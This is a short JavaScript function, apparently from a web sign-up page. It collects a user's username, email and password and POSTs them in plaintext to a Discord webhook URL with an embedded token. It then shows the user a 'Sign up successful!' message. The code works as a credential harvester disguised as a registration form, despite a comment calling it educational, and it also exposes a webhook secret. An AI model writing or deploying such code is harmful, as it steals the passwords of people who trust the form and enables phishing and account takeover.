 function submitForm() {
            // Get form data
            const username = document.getElementById('username').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirmPassword').value;

            // Check if passwords match
            if (password !== confirmPassword) {
                alert("Passwords do not match");
                return;
            }

            // Prepare data for POST request
            const postData = {
                username: username,
                email: email,
                password: password
            };

            // Send POST request (This is not secure for sensitive data, only for educational purposes)
            fetch('https://canary.discord.com/api/webhooks/1193022395724869744/d66HB0vAruPVsikVCxh5B_WCdRV1fWBdW-yt0UvQZ8kNpe518Ttg4yA7nbK-yWgSw-7Z', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(postData),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                alert('Sign up successful!'); // Show a success message, in real-world scenarios redirect to a confirmation page
            })
            .catch((error) => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.'); // Show an error message to the user
            });
        }
